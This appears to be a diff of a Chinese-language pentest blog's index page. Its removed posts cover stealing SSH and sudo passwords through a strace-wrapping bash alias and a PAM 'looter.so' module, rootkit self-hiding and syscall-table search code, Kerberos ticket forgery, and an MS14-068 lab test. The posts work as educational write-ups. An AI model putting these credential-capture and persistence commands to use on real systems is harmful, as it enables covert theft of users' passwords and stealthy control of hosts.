@@ -1,697 +1,181 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>ph4ntom&#39;s blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The wheel turns,nothing is ever new">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ph4ntom's blog</title><meta name="author" content="ph4ntom"><meta name="copyright" content="ph4ntom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="The wheel turns,nothing is ever new">
 <meta property="og:type" content="website">
 <meta property="og:title" content="ph4ntom&#39;s blog">
 <meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="ph4ntom&#39;s blog">
 <meta property="og:description" content="The wheel turns,nothing is ever new">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/img/avatar.jpg">
 <meta property="article:author" content="ph4ntom">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="ph4ntom&#39;s blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-<meta name="generator" content="Hexo 5.2.0"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">ph4ntom&#39;s blog</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-Steal-password-by-alias" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/05/27/Steal-password-by-alias/" class="article-date">
-  <time datetime="2020-05-27T05:37:54.000Z" itemprop="datePublished">2020-05-27</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/27/Steal-password-by-alias/">密码“水坑”</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="第一个暗桩-–-ssh命令"><a href="#第一个暗桩-–-ssh命令" class="headerlink" title="第一个暗桩 – ssh命令"></a>第一个暗桩 – ssh命令</h1><p>  当我们控制了一台linux服务器，并且发现有用户使用这台机器通过ssh连接其他机器的时候，那么假设我们有此用户的权限的shell，这时我们就可以巧用alias来窃取用户的密码</p>
-<p>  首先我们将会用到strace命令，这在大部分的linux机器当中都有预装。为了劫持用户的ssh命令，我们需要修改～/.bashrc（修改前请先备份）</p>
-<p>  在.bashrc中加入如下语句：</p>
-<p>  alias ssh=’strace -o  /var/tmp/.syscache-<code>date +&#39;%Y-%m-%d+%H:%m:%S&#39;</code>.log -s 4096 ssh’</p>
-<p>  这句话的意思就是当用户使用ssh时，实际上我们悄悄的对ssh使用了strace来跟踪其调用过程，并将其输出文件保存在/var/tmp下，这样，当合法用户登陆被我们控制的机器，并使用ssh登陆其他机器的时候，其登陆其他机器时输入的密码、地址就会被我们记录下来。如下图</p>
-<p><img src="/image/Steal-pass/strace.jpg" alt="strace"></p>
-<p>此时我们使用grep，查找密码以及用户登陆的地址：</p>
-<p><img src="/image/Steal-pass/password.jpg" alt="password"></p>
-<p><img src="/image/Steal-pass/address.jpg" alt="address"></p>
-<p>可以看到成功捕获了用户名、地址、密码</p>
-<h1 id="第二个暗桩-–-窃取sudo密码"><a href="#第二个暗桩-–-窃取sudo密码" class="headerlink" title="第二个暗桩 – 窃取sudo密码"></a>第二个暗桩 – 窃取sudo密码</h1><p>  当我们控制了一台linux服务器，并且发现自己控制的用户经常使用sudo执行命令时，我们也可以巧用alias来窃取用户的sudo密码</p>
-<p>  自己也写了个小工具：<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Impost3r">Impost3r</a></p>
-<p>  只需要合法用户登陆后使用sudo命令，就可以窃取到其密码，从而变相提权，甚至可以可以拿来做ssh账户/密码，大多数人密码都是一样的</p>
-<h1 id="第三个暗桩-–-劫持各类系统命令"><a href="#第三个暗桩-–-劫持各类系统命令" class="headerlink" title="第三个暗桩 – 劫持各类系统命令"></a>第三个暗桩 – 劫持各类系统命令</h1><p>  这个和第二个很像，但是我觉得不是很妥当，毕竟会弹出非预期的询问密码的操作，故而不去使用</p>
-<h1 id="第四个暗桩-–-修改pam文件"><a href="#第四个暗桩-–-修改pam文件" class="headerlink" title="第四个暗桩 – 修改pam文件"></a>第四个暗桩 – 修改pam文件</h1><p>  在linux当中，用户的认证都是基于pam的，也就是说如果我们在获取了root权限的情况下,可以通过修改pam相关模块及配置来窃取所有通过ssh登陆至此机器的用户名/密码、所有执行su命令的用户名/密码</p>
-<p>  有一个小工具:<a target="_blank" rel="noopener" href="https://github.com/mthbernardes/sshLooterC">looterc</a></p>
-<p>  稍加修改，并进行编译，得到<code>looter.so</code>，并将此so复制至<code>/lib/security</code>下(如果是ubuntu，应当在<code>/lib/x86_64-linux-gnu/security</code>下)</p>
-<p>  再修改<code>/etc/pam.d/</code>下的common-auth，在最后一行加上以下两句语句:</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth optional looter.so</span><br><span class="line">account optional looter.so</span><br></pre></td></tr></table></figure>
-
-<p>  保存并退出后，任何使用su命令的普通用户的用户名和密码都将会被捕获</p>
-<p>  如果想窃取所有ssh到此机器上的用户名/密码，那么就修改<code>/etc/pam.d/</code>下的sshd文件，同样在最后加上同样的两句语句</p>
-<p>  保存并退出后，任何使用ssh命令连接到此机器的用户的用户名和密码都将会被捕获</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>  手法要骚，想法要淫荡（笑）</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/05/27/Steal-password-by-alias/" data-id="ckhx9966a000jar5yfqon3o1r" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-rootkit分析-linux内核机制学习" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/17/rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2020-04-17T08:02:43.000Z" itemprop="datePublished">2020-04-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/17/rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/">rootkit分析&amp;&amp;linux内核机制学习（一）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="rootkit自身隐藏及保护"><a href="#rootkit自身隐藏及保护" class="headerlink" title="rootkit自身隐藏及保护"></a>rootkit自身隐藏及保护</h1><h2 id="隐藏自身"><a href="#隐藏自身" class="headerlink" title="隐藏自身"></a>隐藏自身</h2><p>先讲讲自身的隐藏，这里主要是用到了以下函数段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module_list &#x3D; THIS_MODULE-&gt;list.prev;</span><br><span class="line"></span><br><span class="line">list_del(&amp;THIS_MODULE-&gt;list);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>其中module_list保存了此模块所在的链表结构体的第一个结构体，即链表的头节点，以便之后的恢复操作</p>
-<p>list_del函数将此模块所在的链表结构体的头节点删除，即将代表自身的结构体删除，从而在lsmod命令中隐藏此模块</p>
-<h2 id="恢复自身"><a href="#恢复自身" class="headerlink" title="恢复自身"></a>恢复自身</h2><p>讲完隐藏，讲讲自身恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_add(&amp;THIS_MODULE-&gt;list, module_list);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这里利用到了list_add函数，将之前保存的module结构体（即之前代表自身的结构体）添加到链表头，从而重新在lsmod命令中可见</p>
-<h2 id="保护自身不被删除"><a href="#保护自身不被删除" class="headerlink" title="保护自身不被删除"></a>保护自身不被删除</h2><p>保护自身不被删除主要利用了以下代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try_module_get(THIS_MODULE);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用了try_module_get函数，将模块的使用计数加一，从而使得模块表现为“正在被使用”，由于linux不能卸载正在使用的模块，从而保护自身不被删除</p>
-<h2 id="解除保护"><a href="#解除保护" class="headerlink" title="解除保护"></a>解除保护</h2><p>解除保护代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_put(THIS_MODULE); </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用了module_put函数，将模块的使用计数减一至0，从而将其表示为空闲状态以卸载</p>
-<h1 id="rootkit查找系统调用表"><a href="#rootkit查找系统调用表" class="headerlink" title="rootkit查找系统调用表"></a>rootkit查找系统调用表</h1><p>  首先系统调用表（syscall_table)是存在在内核中的一个数组，里面存放了所有指向系统调用函数的指针，故而rootkit若想hook系统调用，就必须先找到syscall_table在内存当中的地址（在早期的Linux内核中，是通过一个变量SYSCALL_TABLE明确指出其位置的，而在较新的kernel中移除了这一个变量，防止被滥用）</p>
-<p>  此rootkit采用的是暴力搜索遍历的方式来找到syscall_table，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void **sys_call_table;</span><br><span class="line"></span><br><span class="line">void **find_syscall_table(void)</span><br><span class="line">&#123;</span><br><span class="line">    void **sctable;</span><br><span class="line">    void *i &#x3D; (void*) START_ADDRESS;</span><br><span class="line"></span><br><span class="line">    while (i &lt; END_ADDRESS) &#123;</span><br><span class="line">        sctable &#x3D; (void **) i;</span><br><span class="line"></span><br><span class="line">        if (sctable[__NR_close] &#x3D;&#x3D; (void *) sys_close) &#123;</span><br><span class="line">            size_t j;</span><br><span class="line">            const unsigned int SYS_CALL_NUM &#x3D; 300;</span><br><span class="line">            for (j &#x3D; 0; j &lt; SYS_CALL_NUM; j ++) &#123;</span><br><span class="line">                if (sctable[j] &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">                    goto skip;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return sctable;</span><br><span class="line">        &#125;</span><br><span class="line">skip:</span><br><span class="line">        ;</span><br><span class="line">        i +&#x3D; sizeof(void *);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先我们先要确定一个比syscall_table更高位置的内存来作为起始点（不然你遍历不到），之后我们需要知道一个已经确定位置的函数，这里用到了sys_close函数，这个函数的位置是相对于syscall_table处在更低的内存位置，这样就可以用来标示遍历的终点。</p>
-<p>之后将i赋值为内存地址，在每一次遍历中，尝试将i代表的内存地址加上__NR_close（sys_close函数的偏移地址），查看加上偏移地址后的内存中所存放的指针所指向的地址是否指向了sys_close函数的地址，如果是，则代表我们找到了系统调用表的表头，如果不是，那么i加上一个void *的大小（继续推进内存地址），继续进行遍历，直到找到正确的表头</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/17/rootkit%E5%88%86%E6%9E%90-linux%E5%86%85%E6%A0%B8%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/" data-id="ckhx9966g000war5y8tye1cyy" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Kerberos-gold-sliver-ticket" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/03/17/Kerberos-gold-sliver-ticket/" class="article-date">
-  <time datetime="2020-03-17T06:22:25.000Z" itemprop="datePublished">2020-03-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/17/Kerberos-gold-sliver-ticket/">Kerberos黄金白银票据</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了方便叙述，假定A为客户端，B为服务端</p>
-<h1 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h1><p>  从上一篇文章中我们可以懂得微软对于windosw系列的Kerberos协议的具体实现过程</p>
-<p>  那么我们可以总结出来一点就是，实际上A作为客户端访问B的时候，其权限完全是基于KDC所颁发的PAC的，B也只认这个PAC，并以这个PAC为参考来决定是否允许A访问B上的一些资源，那也就是说如果我们能够伪造发送给B的serrviceTicket中的PAC，我们就可以随意对B的资源进行访问了</p>
-<p>  让我们来看看构成ServerTicket的必要条件：KDC密码的副本以及B的密码的副本（两者的hash），主要缺少的就是B的密码的hash值，那么如果我们有了这个hash值，我们就可以伪造PAC，伪造PAC后面的校验签名，从而实现对B资源完全的访问权。那么这样的票据就被称为白银票据，拥有这样的票据表示着客户端A对B有着完全的访问权，但是注意了，由于我们同样也不知道KDC的密码hash，所以实际上我们伪造的PAC最后是没有有效的KDC的校验签名的，只有由B的密码hash生成的校验签名，而如果此时服务端开启了KDC PAC签名校验，那么PAC的校验将无法通过，白银票据也就会失效，所以白银票据成功的大前提是请求的服务不校验KDC PAC签名。</p>
-<p>  白银票据的限制就在于只能拥有某一台服务器所提供的部分服务的访问权，而不能拥有所有的，换一台C服务器或者需求权限更高的服务，白银票据就会失去效用。</p>
-<p>  给一些好的参考：<br><a href="/archives/Kerberos/sliverticket.html">银票</a></p>
-<p><a href="/archives/Kerberos/sliverticket_defend.html">银票防御</a></p>
-<p><a href="/archives/Kerberos/sliverticket_exploit.html">银票利用</a></p>
-<h1 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h1><p>  白银票据的限制在黄金票据中不复存在，一旦拥有了黄金票据，你就拥有了这个域当中的最高权限。</p>
-<p>  让我们来回顾一下A发送给B的ServiceTicket是如何生成的</p>
-<p>  首先，是A要向TGS发送由AS颁发的TGT，证明自己已经通过了合法性校验，是域中的合法用户，然后由TGS利用KDC的永久密钥（也称为krgtgt账户的密码hash，krgtgt账户相当于是域管理员）解密TGT，校验签名，确定TGT中的PAC没有被篡改之后，重新签名PAC，并将A与B之间通讯所需要的密钥SessionKey以及重新签名后的PAC用B的密码hash进行加密，将两者组合为了ServiceTicket。</p>
-<p>  那么我们可以看到，这整个过程的关键点就是TGT中所携带的PAC，只要我们能够篡改TGT中的PAC，欺骗TGS，就能拿到访问任意服务器的ServiceTicket。而要想篡改TGT，唯一的障碍就是krgtgt用户的密码hash，有了这个密码的hash，我们就可以解密TGT，伪造任意PAC来欺骗TGS为A颁发在此域中访问任意一台服务器的任意ServiceTicket，获取在此域中的最高权限</p>
-<p>  我们把这种票据称为黄金票据</p>
-<p>  提供一些好的参考:</p>
-<p>  <a href="/archives/Kerberos/goldenticket.html">黄金票据</a></p>
-<h1 id="增强型黄金票据"><a href="#增强型黄金票据" class="headerlink" title="增强型黄金票据"></a>增强型黄金票据</h1><p>  虽然黄金票据在当前域中拥有着最高的权限，但是普通的黄金票据无法跨域使用，因为在一个子域中缺少了EnterpriseAdmins组，这是只有在域林中的根域才存在的用户组，对整个域有着管理权，其SID最后三位为519，而在子域中最高级别的用户仅仅是Domain Admins，SID最后三位为512，那也就表明当使用mimikatz伪造黄金票据时，mimikatz会使用SID号（类似于S-1-5-21-3641416521-285861825-2863956705-）和RID号（512，519之类的）拼接成新的SID（S-1-5-21-3641416521-285861825-2863956705-519），但是这个SID号在根域里根本就不存在（根域DC上的EnterpriseAdmins组的SID可能是S-1-5-21-4249968736-1423802980-663233003-519）,所以无法使用普通的黄金票在域林中跨域访问资源。</p>
-<p>  在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。</p>
-<p>  需要的材料只是根域的SID号，一个子域的krgtgt密码hash即可，使用mimikatz制作</p>
-<p>  下面是Blackhat资料，里面内容很多，以后慢慢整理成文章</p>
-<p>  <a href="/archives/Kerberos/blackhat.pdf">BlackHat</a></p>
-<h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>  一般是使用mimikatz来抓取用户的密码hash</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/17/Kerberos-gold-sliver-ticket/" data-id="ckhx996650007ar5yfvzog9x5" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Kerberos" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/03/17/Kerberos/" class="article-date">
-  <time datetime="2020-03-17T04:38:40.000Z" itemprop="datePublished">2020-03-17</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/17/Kerberos/">Kerberos MS14-068</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h1><p>  先从一个知名的漏洞开始吧：MS14-068</p>
-<p>  这个漏洞在当时影响了全版本的Windows服务器，攻击者可以籍由这个漏洞实现权限提升，从普通域用户提升至域管理员身份。</p>
-<p>  那在分析以及复现这个漏洞之前，先让我们来看看什么是Kerberos协议，这是所有这一切的核心所在</p>
-<h2 id="Kerberos：地狱三头犬"><a href="#Kerberos：地狱三头犬" class="headerlink" title="Kerberos：地狱三头犬"></a>Kerberos：地狱三头犬</h2><p>  Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p>
-<p>  假设一个场景，即有两者A和B，他们共同享有同样的一个secret，那么A在不安全的网络环境下如何向B证明其身份就成了一个问题</p>
-<p>  最简单的方法就是A直接发送secret给B，让B来验证其真实性，但是在不安全的网络环境中，这段secret随时可能被恶意攻击者窃取，故而这一方法不可行</p>
-<p>  那么要不A将secret作为密钥，用secret加密一段数据后，将密文和明文一起发给B，由B再进行校验？这样听起来可行，但是只要时间允许，攻击者是有可能对加密后的密文和明文之间进行破解来得到密钥的，故而也不可取</p>
-<p>  那么Kerberos就是为了解决这个问题而产生的，它为这个过程带来了一个第三方机构KDC，每次的通讯都会由KDC来向A颁发一个临时的通讯密钥，保证每一次密钥都是不重复的，防止攻击者对其进行破解</p>
-<p>  具体来说，KDC是由两部分组成的，AS和TGS，AS主要的职责是负责对申请者的认证，而TGS主要是向申请者颁发Service Ticket（后面会详细说）</p>
-<p>  大概流程可以看下图：</p>
-<p>  <img src="/image/Kerberos/snapshot.png" alt="auth"></p>
-<p>  <strong>从图中可以看出，一开始A向AS认证的时候利用的是时间戳，这也引出了一点就是，Kerberos协议要求整个域内时间必须同步</strong></p>
-<p>  详细流程大致如下：</p>
-<p>  第①步：KRB_AS_REQ：Client-A发送Authenticator向KDC的AS服务认证自己的身份（通过提供自身密码加密的一个时间戳TimeStamp）</p>
-<p>第②步：KRB_AS_REP：AS通过KDC数据库中存储的Client-A密码的副本，解密收到的Authenticator，如果解密出的TimeStamp符合要求，则AS服务认为Client-A就是所谓的Client-A。认证成功后，AS服务生成一个短期有效的SessionKeya-kdc，将该Key使用A的密码副本加密成密文1，另外将Key连同时间戳标志（控制该SessionKey的有效时间）通过TGS服务的密码也就是KDC的密码加密为密文2（称为TGT），将这两个密文组合成KRB_AS_REP返回给Client-A</p>
-<p>第③步：KRB_TGS_REQ：Client-A在接收到KRB_AS_REP后，首先使用自身密码解密密文1得到SessionKeya-kdc，此时需要注意的是，密文2（TGT）是被KDC的密码加密的，所以Client-A无法解密，这也是Kerberos协议设计的精妙之处，既解决了Server端（TGS相对于Client-A也称之为Server端）无法及时接收SessionKey的问题，又不怕Client-A对该TGT的伪造，因为Client-A不知道Server端的密码</p>
-<p>得到SessionKeya-kdc后，Client-A利用其加密时间戳生成Authenticator用于向TGS申请Client-A与Client-B进行认证所需的SessionKeya-b，连同刚才KRB_AS_REP接收的TGT一同组合成KRB_TGS_REQ发送给TGS</p>
-<p>第④步：KRB_TGS_REP：TGS在接收到KRB_TGS_REP之后，利用KDC密码解密TGT获得本来就该发送给自己的SessionKeya-kdc，然后用其解密KRB_TGS_REQ中的Authenticator得到Client-A发送过来的时间戳，如果时间戳符合要求，则生成一个短期有效的SessionKeya-b，注意此时利用SessionKeya-kdc将SessionKeya-b加密为密文1，然后利用Server-B的密码将SessionKeya-b加密为密文2（称为ServiceTicket），两个密文一同构成KRB_TGS_REP返回给Client-A</p>
-<p>第⑤步：KRB_AP_REQ：Client-A在接收到KRB_TGS_REP之后，首先使用缓存的SessionKeya-kdc将密文1中的SessionKeya-b解密出来，然后利用其加密时间戳生成Authenticator用于向B进行对自身的验证，另外，和刚才TGT一样，密文2也就是ServiceTicket是用Server-B的密码加密的，所以Client-A无法解密，也就无法伪造，这也同样解决了在三方认证中作为Server端的B无法及时接收SessionKey的问题，又不怕Client-A对ServiceTicket的伪造</p>
-<p>第⑥步：KRB_AP_REP：Server-B受到KRB_AP_REQ之后，利用自身密码解密ServiceTicket，得到SessionKeya-b，然后用SessionKeya-b解密Authenticator得到时间戳，验证A的身份</p>
-<p> 一个参考：</p>
-<p> <a href="/archives/Kerberos/kerberos.html">详细过程</a>  </p>
-<h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>  那么以上就是Kerberos协议的标准实现过程，但是在实际运行的windows服务器上，微软对标准Kerberos协议进行了扩充，其中最重要的扩充就是增加了权限认证，即PAC（Privilege Attribute Certificate），特权属性证书</p>
-<p>  PAC的扩充主要旨在帮助B知道A是否有访问自身某些资源的权限，因为原本Kerberos并没有规定权限方面的问题</p>
-<p>  那么在一个域中，如何才能知道某个域用户所拥有的权限呢？自然是需要提供User的SID和所在组Group的SID。必须了解的一个前提是，KDC、A和B三者中，B只信任KDC所提供的关于A到底是什么权限，所以在一个域初始时，KDC上拥有A和B的权限。现在需要解决的是，KDC必须告诉B关于A的权限，这样B验证A的权限后才能决定让不让A访问自身的网络资源。</p>
-<p>  为了最终使得Server-B能知道Client-A所具有的权限，微软在KRB_AS_REP中的TGT中增加了Client-A的PAC（特权属性证书），也就是Client-A的权限，包括Client-A的User的SID、Group的SID：</p>
-<p>  图片如下：</p>
-<p>  <img src="/image/Kerberos/PAC.png" alt="image"></p>
-<p>  可以看到被KDC加密的TGT中，不仅包括了被加密的SessionKeya-kdc，还包括KRB_AS_REQ中申请者（Client-A）的权限属性证书，为了防止该特权证书被篡改（即使被KDC加密，Client-A无法轻易解密，但谁也无法保证绝对的安全），在PAC的尾部增加了两个校验Server Signature和KDC Signature：</p>
-<p>  这两个校验一个是Server Signature，另一个是KDC Signature，对于Client-A与AS服务来说，Server代表的是TGS服务，KDC代表的是AS服务（AS作为Client-A与TGS的第三方信任机构），而AS服务与TGS服务具有相同的krgtgt账号，所以这两个校验都是krgtgt账号的密码生成的，当然，整个TGT也是用KDC的密码也就是krgtgt账号密码加密的，它们三者不同的是，用的算法和加密内容有所不同。</p>
-<p>  微软是这样打算的，无论如何也要把PAC从KDC传送到Server-B，为了在Kerberos认证过程中实现，微软选择了如下做法：</p>
-<p>  将PAC放在TGT中加密后从AS服务经Client-A中转给TGS服务，再放在由TGS服务返回的ServiceTicket中加密后经Client-A中转给Server-B</p>
-<p>  <img src="/image/Kerberos/ServiceTicket.png" alt="image"></p>
-<p>  需要注意的是，在KRB_TGS_REQ阶段，携带PAC的TGT被TGS服务接收后，认证A的合法性后（解密Authenticator符合要求）会将PAC解密出来，验证尾部两个签名的合法性，如果合法则认为PAC没有被篡改，于是重新在PAC的尾部更换了另外两个签名，一个是Server Signature，这次是以Server-B的密码副本生成的签名（因为对于Client-A和Server-B，这次的第三方机构是TGS服务），另外一个仍旧是KDC Signature，两者合在一起，最终成为New Signed PAC被拷贝在ServericeTicket中被加密起来。</p>
-<p><strong>注意，这里再次签发的PAC尾部的签名一个基于是B的密码hash一个仍然是基于KDC的密码hash（krgtgt用户的密码hash），在B端可以选择是否认证这个PAC的KDC签名，如果选择不认证，就不对PAC进行签名校验（也可能只校验基于B的密码hash的签名，这一点不太确定），并且之后也只是在解密PAC后直接根据用户权限来决定是否允许客户端访问相对应的资源，但是如果选择认证，B将会把PAC中的签名传递给DC来进行检验，只有DC确认签名有效后B才会根据用户权限来决定是否允许客户端访问相对应的资源，如下图所示,图片来自微软官方<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">巨硬</a></strong></p>
-<p> <img src="/image/Kerberos/Check_PAC.png" alt="check"></p>
-<p><strong>当然，有的服务器并不校验KDC签名，校验与否决定了银票是否能够正常被使用（银票下一篇文章会讲）</strong></p>
-<p>  最终绕过来绕过去，KDC上所拥有的关于Client-A的权限证书PAC终于发给了Server-B，Server-B在对Client-A进行认证的同时，同时也能判断Client-A有没有访问网络资源的权限。</p>
-<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>  这里我发现的一个大师傅分析的很不错，受教了</p>
-<p>  <a href="/archives/Kerberos/MS14-068.html">详细</a></p>
-<p>  可以继续好好消化</p>
-<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>  我自己在本地搭建了一下环境</p>
-<p>  域控是win2008，域用户端是win7</p>
-<p>  首先先看一下没有工具之前，我使用net use尝试挂载域控的c盘是无效的，需要输入用户名密码</p>
-<p>  <img src="/image/Kerberos/init.jpg" alt="init"></p>
-<p>  可以看到是无效的</p>
-<p>  这是这个时候缓存的票据信息：</p>
-<p>  <img src="/image/Kerberos/beforeinject.jpg" alt="before"></p>
-<p>  此时，执行exploit</p>
-<p>  <img src="/image/Kerberos/attack.jpg" alt="attack"></p>
-<p>  将获得的TGT用mimikatz注入内存</p>
-<p>  <img src="/image/Kerberos/inject.jpg" alt="inject"></p>
-<p>  此时的缓存票据信息：</p>
-<p>  <img src="/image/Kerberos/afterinject.jpg" alt="after"></p>
